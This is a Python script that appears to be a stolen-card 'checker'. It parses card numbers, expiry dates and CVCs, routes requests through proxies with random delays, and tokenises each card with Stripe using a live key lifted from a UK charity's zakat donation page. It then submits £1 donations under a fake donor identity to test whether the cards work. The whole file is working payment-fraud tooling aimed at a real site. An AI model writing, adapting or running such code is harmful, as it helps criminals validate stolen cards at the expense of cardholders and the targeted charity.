import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))
        
        

        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1577ab39-f384-4718-b602-8c6e2a851115547985&muid=a8a63c8d-9cc6-4345-945a-f1ee6dd0ae73890108&sid=9257b1d9-b80b-4d4d-925d-6539fa7d07283a6cfe&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Falfurqanmcr.org&time_on_page=36567&key=pk_live_51Mrfm6A2rsxWxTcKIUzeVIi0SqsWAyCE5FsQSuTkKNJXgzh126h7goCV2DZ7pqpb0YMA7q9G2wN7ORYETXBSHuwD00RD4MJjV7'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
        	id = response.json()['id']
        except:
        	pass


        cookies = {
    '__stripe_mid': 'a8a63c8d-9cc6-4345-945a-f1ee6dd0ae73890108',
    '__stripe_sid': '9257b1d9-b80b-4d4d-925d-6539fa7d07283a6cfe',
}

        headers = {
    'authority': 'alfurqanmcr.org',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=a8a63c8d-9cc6-4345-945a-f1ee6dd0ae73890108; __stripe_sid=9257b1d9-b80b-4d4d-925d-6539fa7d07283a6cfe',
    'origin': 'https://alfurqanmcr.org',
    'referer': 'https://alfurqanmcr.org/zakat/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

        params = {
    't': '1735440915262',
}

        data = {
    'data': f'__fluent_form_embded_post_id=4829&_fluentform_37_fluentformnonce=178089c6b4&_wp_http_referer=%2Fzakat%2F&names%5Bfirst_name%5D=Khant%20Ti&names%5Blast_name%5D=Kyi&email=thur07656%40gmail.com&address_1%5Baddress_line_1%5D=Hssg&address_1%5Baddress_line_2%5D=Zgzg&address_1%5Bcity%5D=New%20york&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=GB&payment_input=Other&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id={id}',
    'action': 'fluentform_submit',
    'form_id': '37',
}

        r2 = requests.post(
    'https://alfurqanmcr.org/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
        
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip
